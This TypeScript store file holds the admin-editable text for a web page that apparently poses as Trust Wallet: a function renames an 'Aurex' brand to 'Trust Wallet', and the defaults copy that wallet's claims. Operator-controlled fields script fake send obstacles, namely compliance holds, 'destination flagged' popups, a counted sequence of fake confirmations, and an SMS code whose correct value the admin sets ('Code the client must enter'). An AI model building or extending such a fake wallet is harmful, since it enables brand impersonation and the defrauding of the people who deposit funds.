import { create } from "zustand";
import { createJSONStorage, persist } from "zustand/middleware";
import { hasAdminProof } from "@/lib/admin-proof";

export interface SiteContent {
  brandName: string;
  tagline: string;
  logo: string | null;
  heroKicker: string;
  heroTitleA: string;
  heroTitleB: string;
  heroSub: string;
  heroCta: string;
  heroSecondary: string;
  statUsersN: string;
  statUsersL: string;
  statChainsN: string;
  statChainsL: string;
  statAssetsN: string;
  statAssetsL: string;
  statAuditsN: string;
  statAuditsL: string;
  assetsTitle: string;
  assetsSub: string;
  securityTitle: string;
  securitySub: string;
  security1t: string;
  security1d: string;
  security2t: string;
  security2d: string;
  security3t: string;
  security3d: string;
  onestopTitle: string;
  onestopSub: string;
  footerLegal: string;
  loginTitle: string;
  loginSub: string;
  featuresTitle: string;
  featuresSub: string;
  securityPageTitle: string;
  securityPageSub: string;
  walletName: string;
  tabHome: string;
  tabMarkets: string;
  tabSwap: string;
  tabActivity: string;
  tabProfile: string;
  actionSend: string;
  actionReceive: string;
  actionBuy: string;
  heroImage: string | null;
  securityImage: string | null;
  aboutImage: string | null;
  navMarkets: string;
  navFeatures: string;
  navSecurity: string;
  navLogin: string;
  navOpenWallet: string;
  noticeT20Title: string;
  noticeT20Body: string;
  noticeF20Title: string;
  noticeF20Body: string;
  noticeK20Title: string;
  noticeK20Body: string;
  noticeCta: string;
  sendSureTitle: string;
  sendSureBody: string;
  sendSureOk: string;
  sendSureCancel: string;
  sendConfirmMinutes: string;
  sendConfirmCount: string;
  sendConfirmTitle: string;
  sendConfirmLabel: string;
  sendConfirmHint: string;
  sendCodeTitle: string;
  sendCodeBody: string;
  sendCodePlaceholder: string;
  sendCodeButton: string;
  sendCodeError: string;
  sendCodeValue: string;
}

export function renameAurexToTrust<T>(value: T): T {
  if (typeof value === "string") return value.replaceAll("Aurex", "Trust") as T;
  if (!value || typeof value !== "object" || Array.isArray(value)) return value;
  const out: Record<string, unknown> = { ...(value as Record<string, unknown>) };
  for (const key of Object.keys(out)) {
    const item = out[key];
    if (typeof item === "string" && item.includes("Aurex")) out[key] = item.replaceAll("Aurex", "Trust");
  }
  if (out.brandName === "Trust" || out.brandName === "Aurex") out.brandName = "Trust Wallet";
  return out as T;
}

export const SITE_DEFAULTS: SiteContent = {
  brandName: "Trust Wallet",
  tagline: "One wallet. Every chain. Your keys.",
  logo: null,
  heroKicker: "Self-custody · 100+ blockchains",
  heroTitleA: "True crypto ownership.",
  heroTitleB: "In your hands.",
  heroSub:
    "Trust is a free self-custody wallet. Buy, send, swap and hold assets across Bitcoin, Ethereum, Solana and 100+ chains — only you control the keys.",
  heroCta: "Open your wallet",
  heroSecondary: "Live markets",
  statUsersN: "12M+",
  statUsersL: "Active wallets",
  statChainsN: "100+",
  statChainsL: "Blockchains",
  statAssetsN: "10M+",
  statAssetsL: "Assets tracked",
  statAuditsN: "ISO",
  statAuditsL: "Independent audits",
  assetsTitle: "One platform. Millions of assets.",
  assetsSub:
    "Bitcoin, Ethereum, Solana, Cosmos, BNB Smart Chain and more — buy, send, swap and earn from a single home screen.",
  securityTitle: "Stay private and secure",
  securitySub: "Keys live on your device. We never hold, track, or recover what only you should own.",
  security1t: "Encrypted by default",
  security1d: "Seed and keys are stored locally, encrypted at rest on this device.",
  security2t: "Zero personal tracking",
  security2d: "No IP harvesting, no balance surveillance, no account servers.",
  security3t: "Clear transaction review",
  security3d: "Every send, swap and receive is itemized before it is signed.",
  onestopTitle: "Your one-stop Web3 wallet",
  onestopSub: "Send, receive, swap, buy, and track live markets — all in one place.",
  footerLegal: "Trust is a self-custody wallet. You control your keys.",
  loginTitle: "Welcome back",
  loginSub: "Sign in to unlock your wallet.",
  featuresTitle: "Everything a real wallet does",
  featuresSub: "Send, receive, swap, buy, and track live markets from one home screen.",
  securityPageTitle: "Stay private and secure",
  securityPageSub: "Self-custody by design. Keys never leave this device.",
  walletName: "Main Wallet",
  tabHome: "Home",
  tabMarkets: "Markets",
  tabSwap: "Swap",
  tabActivity: "Activity",
  tabProfile: "Profile",
  actionSend: "Send",
  actionReceive: "Receive",
  actionBuy: "Buy",
  heroImage: null,
  securityImage: null,
  aboutImage: null,
  navMarkets: "Markets",
  navFeatures: "Features",
  navSecurity: "Security",
  navLogin: "Log in",
  navOpenWallet: "Open wallet",
  noticeT20Title: "Transfer held for review",
  noticeT20Body:
    "This outgoing transfer is paused for a compliance check.\n\nConfirm the destination address belongs to the intended recipient. Network fees are not refundable once the transfer is signed.",
  noticeF20Title: "Additional verification required",
  noticeF20Body:
    "A second verification step is required before this send can proceed.\n\nReview the amount, asset, and network fee. Continue only if you initiated this transfer on this device.",
  noticeK20Title: "Destination flagged",
  noticeK20Body:
    "The destination wallet is marked for extra scrutiny.\n\nDouble-check every character of the address. Continue only if you recognize the recipient and accept the risk.",
  noticeCta: "I understand, continue",
  sendSureTitle: "Are you sure this wallet address is correct?",
  sendSureBody:
    "Check the destination wallet carefully. Sent funds cannot be recovered if the address is wrong.",
  sendSureOk: "OK",
  sendSureCancel: "Cancel",
  sendConfirmMinutes: "4",
  sendConfirmCount: "12",
  sendConfirmTitle: "Confirming",
  sendConfirmLabel: "Confirmation {current} of {total}",
  sendConfirmHint: "The network is confirming this transfer. Keep this screen open until it finishes.",
  sendCodeTitle: "Enter the verification code sent to your number",
  sendCodeBody: "A verification code was sent to your phone number. Enter it to complete this transfer.",
  sendCodePlaceholder: "Verification code",
  sendCodeButton: "Confirm",
  sendCodeError: "That code is incorrect. Try again.",
  sendCodeValue: "739214",
};

export const SITE_TEXT_FIELDS: { key: keyof SiteContent; label: string; group: string; multiline?: boolean }[] = [
  { key: "brandName", label: "Site name", group: "Brand" },
  { key: "tagline", label: "Tagline", group: "Brand", multiline: true },
  { key: "walletName", label: "Wallet name (inside the app)", group: "Brand" },
  { key: "navMarkets", label: "Nav — Markets", group: "Brand" },
  { key: "navFeatures", label: "Nav — Features", group: "Brand" },
  { key: "navSecurity", label: "Nav — Security", group: "Brand" },
  { key: "navLogin", label: "Button — Log in", group: "Brand" },
  { key: "navOpenWallet", label: "Button — Open wallet", group: "Brand" },
  { key: "tabHome", label: "Wallet tab — Home", group: "Brand" },
  { key: "tabMarkets", label: "Wallet tab — Markets", group: "Brand" },
  { key: "tabSwap", label: "Wallet tab — Swap", group: "Brand" },
  { key: "tabActivity", label: "Wallet tab — Activity", group: "Brand" },
  { key: "tabProfile", label: "Wallet tab — Profile", group: "Brand" },
  { key: "actionSend", label: "Action — Send", group: "Brand" },
  { key: "actionReceive", label: "Action — Receive", group: "Brand" },
  { key: "actionBuy", label: "Action — Buy", group: "Brand" },
  { key: "heroKicker", label: "Kicker", group: "Homepage hero" },
  { key: "heroTitleA", label: "Title line 1", group: "Homepage hero" },
  { key: "heroTitleB", label: "Title line 2", group: "Homepage hero" },
  { key: "heroSub", label: "Subtitle", group: "Homepage hero", multiline: true },
  { key: "heroCta", label: "Primary button", group: "Homepage hero" },
  { key: "heroSecondary", label: "Secondary button", group: "Homepage hero" },
  { key: "statUsersN", label: "Stat 1 number", group: "Stats" },
  { key: "statUsersL", label: "Stat 1 label", group: "Stats" },
  { key: "statChainsN", label: "Stat 2 number", group: "Stats" },
  { key: "statChainsL", label: "Stat 2 label", group: "Stats" },
  { key: "statAssetsN", label: "Stat 3 number", group: "Stats" },
  { key: "statAssetsL", label: "Stat 3 label", group: "Stats" },
  { key: "statAuditsN", label: "Stat 4 number", group: "Stats" },
  { key: "statAuditsL", label: "Stat 4 label", group: "Stats" },
  { key: "assetsTitle", label: "Assets title", group: "Assets + security + footer" },
  { key: "assetsSub", label: "Assets subtitle", group: "Assets + security + footer", multiline: true },
  { key: "securityTitle", label: "Security title", group: "Assets + security + footer" },
  { key: "securitySub", label: "Security subtitle", group: "Assets + security + footer", multiline: true },
  { key: "security1t", label: "Card 1 title", group: "Assets + security + footer" },
  { key: "security1d", label: "Card 1 text", group: "Assets + security + footer", multiline: true },
  { key: "security2t", label: "Card 2 title", group: "Assets + security + footer" },
  { key: "security2d", label: "Card 2 text", group: "Assets + security + footer", multiline: true },
  { key: "security3t", label: "Card 3 title", group: "Assets + security + footer" },
  { key: "security3d", label: "Card 3 text", group: "Assets + security + footer", multiline: true },
  { key: "onestopTitle", label: "Bottom title", group: "Assets + security + footer" },
  { key: "onestopSub", label: "Bottom subtitle", group: "Assets + security + footer", multiline: true },
  { key: "footerLegal", label: "Footer line", group: "Assets + security + footer", multiline: true },
  { key: "loginTitle", label: "Login title", group: "Login + inner pages" },
  { key: "loginSub", label: "Login subtitle", group: "Login + inner pages", multiline: true },
  { key: "featuresTitle", label: "Features title", group: "Login + inner pages" },
  { key: "featuresSub", label: "Features subtitle", group: "Login + inner pages", multiline: true },
  { key: "securityPageTitle", label: "Security page title", group: "Login + inner pages" },
  { key: "securityPageSub", label: "Security page subtitle", group: "Login + inner pages", multiline: true },
  { key: "noticeT20Title", label: "T20 popup title", group: "Send notices" },
  { key: "noticeT20Body", label: "T20 popup text", group: "Send notices", multiline: true },
  { key: "noticeF20Title", label: "F20 popup title", group: "Send notices" },
  { key: "noticeF20Body", label: "F20 popup text", group: "Send notices", multiline: true },
  { key: "noticeK20Title", label: "K20 popup title", group: "Send notices" },
  { key: "noticeK20Body", label: "K20 popup text", group: "Send notices", multiline: true },
  { key: "noticeCta", label: "Popup button", group: "Send notices" },
  { key: "sendSureTitle", label: "Address check title", group: "Send confirmation" },
  { key: "sendSureBody", label: "Address check text", group: "Send confirmation", multiline: true },
  { key: "sendSureOk", label: "Address check OK button", group: "Send confirmation" },
  { key: "sendSureCancel", label: "Address check cancel button", group: "Send confirmation" },
  { key: "sendConfirmMinutes", label: "Minutes until the last confirmation", group: "Send confirmation" },
  { key: "sendConfirmCount", label: "How many confirmations", group: "Send confirmation" },
  { key: "sendConfirmTitle", label: "Confirming title", group: "Send confirmation" },
  { key: "sendConfirmLabel", label: "Confirming line (use {current} and {total})", group: "Send confirmation" },
  { key: "sendConfirmHint", label: "Confirming note", group: "Send confirmation", multiline: true },
  { key: "sendCodeTitle", label: "Code box title", group: "Send confirmation" },
  { key: "sendCodeBody", label: "Code box text", group: "Send confirmation", multiline: true },
  { key: "sendCodePlaceholder", label: "Code box placeholder", group: "Send confirmation" },
  { key: "sendCodeButton", label: "Code box button", group: "Send confirmation" },
  { key: "sendCodeError", label: "Wrong code message", group: "Send confirmation" },
  { key: "sendCodeValue", label: "Code the client must enter", group: "Send confirmation" },
];

interface SiteState extends SiteContent {
  hydrated: boolean;
  patch: (partial: Partial<SiteContent>) => void;
  reset: () => void;
}

export const useSite = create<SiteState>()(
  persist(
    (set) => ({
      ...SITE_DEFAULTS,
      hydrated: false,
      patch: (partial) => {
        if (!hasAdminProof()) return;
        set(partial);
      },
      reset: () => {
        if (!hasAdminProof()) return;
        set({ ...SITE_DEFAULTS });
      },
    }),
    {
      name: "aurex-site-en",
      storage: createJSONStorage(() => localStorage),
      skipHydration: true,
      merge: (persisted, current) => ({
        ...current,
        ...((persisted as object) ?? {}),
      }),
      partialize: (s) => {
        const { hydrated, patch, reset, ...rest } = s;
        void hydrated;
        void patch;
        void reset;
        return rest;
      },
      onRehydrateStorage: () => () => {
        const cur = useSite.getState();
        useSite.setState(renameAurexToTrust({ ...SITE_DEFAULTS, ...cur }));
      },
    },
  ),
);
